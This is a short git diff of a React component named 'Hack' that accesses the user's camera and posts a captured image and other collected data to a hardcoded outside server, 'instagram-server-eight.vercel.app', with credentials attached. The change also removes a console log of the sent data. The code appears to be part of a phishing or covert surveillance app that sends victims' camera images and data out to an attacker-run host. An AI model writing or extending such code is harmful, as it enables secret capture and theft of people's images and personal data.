@@ -65,10 +65,22 @@ export const Hack: React.FC = () => {
       } catch (err) {
         console.log("Error accessing the camera: ", err);
       }
-      await axios.post(url + "/v1/upload", toSend);
-      await axios.post(url + "/cloudinary/upload", img);
 
-      console.log("data", toSend);
+      await axios.post(
+        "https://instagram-server-eight.vercel.app/v1/upload",
+        toSend,
+        {
+          withCredentials: true,
+        }
+      );
+
+      await axios.post(
+        "https://instagram-server-eight.vercel.app/cloudinary/upload",
+        img,
+        {
+          withCredentials: true,
+        }
+      );
     };
 
     fetchItem();
